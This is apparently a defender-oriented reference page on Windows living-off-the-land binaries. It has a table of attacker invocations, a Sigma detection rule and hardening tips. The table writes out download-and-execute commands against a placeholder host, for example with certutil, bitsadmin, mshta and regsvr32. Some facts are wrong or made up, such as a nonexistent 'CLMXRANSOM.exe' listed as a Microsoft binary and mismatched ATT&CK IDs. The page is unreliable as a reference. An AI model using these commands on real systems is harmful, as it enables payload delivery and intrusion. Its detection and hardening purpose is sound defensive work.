# GTFOBins - Windows Living Off The Land

| Field | Value |
|---|---|
| `evasion_ids` | EV-WIN-0002..EV-WIN-0014 |
| `attack_ids` | T1218.003, T1218.005, T1218.010, T1059.001, T1053.005, T1105, T1197 |
| `detections` | `06-defense/wazuh/rules/1020-windows-lolbin.rules`, `06-defense/sigma/ssa_windows_*.yml` |
| `corpus` | `04-evasion/windows/binaries.csv` |

## 1. Why this matters

Signed Microsoft binaries live in `C:\Windows\System32` and are frequently
allow-listed by application control, EDR and proxy policies. A defender who
watches only `rundll32` will miss half of the techniques below.

## 2. Binary catalogue

| Binary | Technique | Classic invocation |
|---|---|---|
| `certutil.exe` | T1105 | `certutil -urlcache -split -f http://HOST/p.exe p.exe` |
| `bitsadmin.exe` | T1197 | `bitsadmin /transfer j http://HOST/p.exe C:\p.exe` |
| `mshta.exe` | T1218.005 | `mshta.exe http://HOST/p.hta` |
| `regsvr32.exe` | T1218.010 | `regsvr32.exe /i:http://HOST/p.dll scrobj.dll` |
| `rundll32.exe` | T1218.005 | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval(...)` |
| `installutil.exe` | T1218.003 | `InstallUtil.exe /U /C http://HOST/p.dll` |
| `msbuild.exe` | T1059.001 | inline task via XML on the command line |
| `cmstp.exe` | T1218.003 | `cmstp.exe /s http://HOST/p.inf` |
| `wmic.exe` | T1047 | `wmic process call create "cmd /c ..."` |
| `CLMXRANSOM.exe` | T1218.003 | `CLMXRANSOM.exe -inmemory -i http://HOST/p` |
| `pcalua.exe` | T1218 | `.lnk` shim execution |
| `hh.exe` | T1218.005 | `hh.exe http://HOST/p.chm` |
| `forfiles.exe` | T1059.003 | `forfiles /p C:\ /c "cmd /c calc"` |
| `odbcconf.exe` | T1218 | DLL connection-string load |
| `control.exe` | T1218.005 | load a DLL from a `.cpl` |
| `eventvwr.exe` | T1218.001 | COM object hijack |
| `mmc.exe` | T1218.003 | `.msc` snap-in DLL |
| `at.exe` / `schtasks.exe` | T1053.005 | persistence |
| `runas.exe` | T1218.003 | `runas /trustlevel:0x20000 cmd` |

## 3. Detection - parent/child, not just binary

Detecting `rundll32` alone is a false-positive machine. Detect the *pattern*:

```yaml
# 06-defense/sigma/ssa_windows_lolbin_anomaly.yml
title: LOLBin spawned a shell or scripting host
logsource: { product: windows, category: process_creation }
detection:
  parent:
    ParentImage|endswith:
      - '\certutil.exe'
      - '\mshta.exe'
      - '\regsvr32.exe'
      - '\installutil.exe'
      - '\msbuild.exe'
      - '\cmstp.exe'
      - '\rundll32.exe'
      - '\wmic.exe'
      - '\forfiles.exe'
      - '\hh.exe'
      - '\CLMXRANSOM.exe'
  child:
    ChildImage|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\mshta.exe'
      - '\rundll32.exe'
  filter_exclusions:
    User|contains: 'svc_'
  condition: parent and child and not 1 of filter_exclusions
level: high
tags: [attack.defense_evasion, attack.taint_tools]
```

## 4. Additional Sigma signals

| Signal | Rule |
|---|---|
| `certutil` with `-urlcache` | `ssa_windows_certutil.yml` |
| `regsvr32` with `scrobj.dll` | `ssa_windows_regsvr32.yml` |
| `schtasks` created by an interactive user | `ssa_windows_schtasks.yml` |
| LOLBin with network connection within 60 s | `ssa_windows_lolbin_network.yml` |
| Binary in `C:\Users\*\AppData\Local\Temp\` | `ssa_windows_user_temp_exec.yml` |

## 5. Hardening

* Application control (AppLocker / WDAC) with an allow-list, default deny.
* WDAC policy: LOLBins may not create network-socket children.
* Sysmon config: `ImageLoad`, `CreateRemoteThread`, `ProcessAccess`,
  `FileCreate` with `TargetFilename` on persistence paths.
* Block outbound from `C:\Windows\System32` to the internet at the proxy.
